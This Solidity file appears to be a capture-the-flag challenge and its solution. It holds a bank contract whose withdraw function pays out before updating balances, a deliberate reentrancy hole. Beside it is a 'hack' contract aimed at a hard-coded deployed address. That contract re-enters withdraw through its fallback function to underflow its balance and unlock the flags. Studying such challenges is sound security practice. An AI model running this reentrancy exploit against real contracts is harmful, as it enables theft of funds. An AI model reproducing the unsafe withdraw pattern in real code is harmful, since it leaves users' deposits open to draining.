pragma solidity ^0.4.26;

contract JCBank {
    mapping (address => uint) public balance;
    mapping (uint => bool) public got_flag;
    uint128 secret;

    constructor (uint128 init_secret) public {
        secret = init_secret;
    }

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(balance[msg.sender] >= amount);
        msg.sender.call.value(amount)();
        balance[msg.sender] -= amount;
    }

    function get_flag_1(uint128 guess) public view returns(string) {
        require(guess == secret);

        bytes memory h = new bytes(32);
        for (uint i = 0; i < 32; i++) {
            uint b = (secret >> (4 * i)) & 0xF;
            if (b < 10) {
                h[31 - i] = byte(b + 48);
            } else {
                h[31 - i] = byte(b + 87);
            }
        }
        return string(abi.encodePacked("flag{", h, "}"));
    }

    function get_flag_2(uint user_id) public {
        require(balance[msg.sender] > 1000000000000 ether);
        got_flag[user_id] = true;
        balance[msg.sender] = 0;
    }
}

contract hack {
    address instance_address = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51;
    JCBank target = JCBank(instance_address);
    uint public have_withdraw = 0;
    string public s;
    
    constructor() public payable {}
    
    function attack() public {
        target.deposit.value(0.1 ether)();
    }
    
    function attack1(uint128 guess) public {
        s=target.get_flag_1(guess);
    }
    
    function attack2() public {
        if(have_withdraw == 1){
            target.get_flag_2(155418233698);
        }
    }

    function attack3() public {
        target.withdraw(0.1 ether);
    }

    function() payable {
        if (have_withdraw == 0 && msg.sender == instance_address){
            have_withdraw = 1;
            target.withdraw(0.1 ether);
        }
    }
}
